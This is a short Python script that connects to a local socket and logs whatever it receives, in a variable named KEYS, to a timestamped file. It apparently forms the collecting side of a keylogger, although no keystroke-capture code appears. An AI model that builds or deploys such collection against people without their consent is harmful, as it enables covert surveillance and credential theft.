import socket
import threading
import time
import logging 

s = socket.socket()          
  
# Define the port you want to connect 
port = 12345                
  
# connect to the server on local computer (you can change it to the ip address of the computer)
s.connect(('127.0.0.1', port))


while True:

    KEYS = s.recv(1024).decode('utf-8')
    
    print (KEYS, end =' ')
    #Create and configure logger 
    logging.basicConfig(filename="KEYS.log", 
                        format='%(asctime)s %(message)s', 
                        filemode='a+')
    #Creating an object 
    logger=logging.getLogger() 
      
    #Setting the threshold of logger to DEBUG 
    logger.setLevel(logging.DEBUG)
    logger.info(KEYS)
    
    #time.sleep(1) # add this to save ur cpu & ram!

# close the connection (with the condition that finishes the second loop)
s.close()
